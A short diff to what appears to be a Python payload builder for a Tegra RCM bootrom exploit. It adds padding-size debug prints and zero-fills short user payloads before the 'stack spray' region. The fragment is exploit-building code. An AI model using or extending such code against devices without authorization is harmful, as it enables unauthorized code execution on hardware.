@@ -692,6 +692,7 @@ print("Payload offset of padding before user payload: 0x{:08x}".format(len(paylo
 
 # Pad the payload till the start of the user payload.
 padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
+print("padding_size: 0x{:08x}".format(padding_size))
 payload += (b'\0' * padding_size)
 
 target_payload = b''
@@ -704,7 +705,13 @@ print("Payload offset of user payload first part: 0x{:08x}".format(len(payload))
 
 # Fit a collection of the payload before the stack spray...
 padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
+print("padding_size: 0x{:08x}".format(padding_size))
 payload += target_payload[:padding_size]
+
+if len(target_payload) < padding_size:
+    padding_size   = padding_size - len(target_payload)
+    print("small payload padding_size: 0x{:08x}".format(padding_size))
+    payload += (b'\0' * padding_size)
 
 print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
